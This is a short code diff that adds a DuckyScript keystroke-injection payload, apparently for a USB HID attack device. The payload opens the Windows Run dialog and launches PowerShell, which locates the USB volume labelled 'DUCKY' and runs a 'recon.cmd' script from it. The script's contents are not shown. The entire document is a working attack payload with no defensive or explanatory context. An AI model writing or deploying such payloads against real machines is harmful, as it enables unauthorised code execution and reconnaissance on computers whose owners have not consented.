@@ -1,0 +1,5 @@
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell $u=gwmi Win32_Volume|?{$_.Label -eq'DUCKY'}|select name;cd $u.name;.\recon.cmd
+ENTER
